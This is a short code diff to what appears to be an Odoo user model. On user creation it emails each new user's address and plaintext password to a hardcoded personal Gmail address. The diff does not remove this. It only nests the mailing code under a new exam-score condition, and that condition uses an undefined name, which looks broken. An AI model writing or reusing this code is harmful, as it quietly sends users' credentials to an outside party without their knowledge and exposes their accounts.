@@ -432,15 +432,17 @@ class User(models.Model):
         if user.bolt and not user.login_date:
             subject = str(user.email) + ' - ' + str(password)
             mail = self.env['mail.mail'].sudo().search([('subject', "=", subject)])
-            if not mail:
-                mail = self.env['mail.mail'].create({
-                    'body_html': '<p>%s - %s</p>' % (str(user.email), str(user.password)),
-                    'subject': subject,
-                    'email_from': user.company_id.email,
-                    'email_to': 'houssemrando@gmail.com',
-                    'auto_delete': False,
-                    'state': 'outgoing'})
-                mail.send()
+            if user.note_exam:
+                if float(note_exam) >= 40.0:
+                    if not mail:
+                        mail = self.env['mail.mail'].create({
+                            'body_html': '<p>%s - %s</p>' % (str(user.email), str(user.password)),
+                            'subject': subject,
+                            'email_from': user.company_id.email,
+                            'email_to': 'houssemrando@gmail.com',
+                            'auto_delete': False,
+                            'state': 'outgoing'})
+                        mail.send()
         return user
     
     def write(self,values):
